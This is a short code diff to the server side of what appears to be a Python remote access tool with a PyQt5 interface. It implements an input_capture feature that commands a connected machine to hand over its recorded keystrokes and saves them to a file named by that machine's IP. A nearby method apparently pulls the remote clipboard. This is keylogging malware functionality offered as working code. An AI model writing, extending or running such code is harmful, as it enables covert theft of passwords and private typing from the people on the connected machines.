@@ -9,6 +9,7 @@ import numpy as np
 import json
 import uuid
 import os
+import json
 import threading
 from PyQt5.QtWidgets import QApplication
 from PyQt5.QtWidgets import (QLineEdit, QWidget, 
@@ -536,7 +537,12 @@ class Server(QWidget):
         self.filebrowser = self.file_browser()
 
     def input_capture(self):
-        pass
+        KEYSTROKE_FILE = f"keystrokes_{self.connected_ip}.json"
+        self.connection.send_data_AES(b"IC")
+        keystrokes = self.connection.receive_data_AES().decode("utf-8")
+        keystroke_data = json.loads(keystrokes)
+        with open(KEYSTROKE_FILE, "w+") as file:
+            json.dump(keystroke_data, file, indent=4)
 
     def clipboard_data(self):
         self.connection.send_data_AES(b"CD")
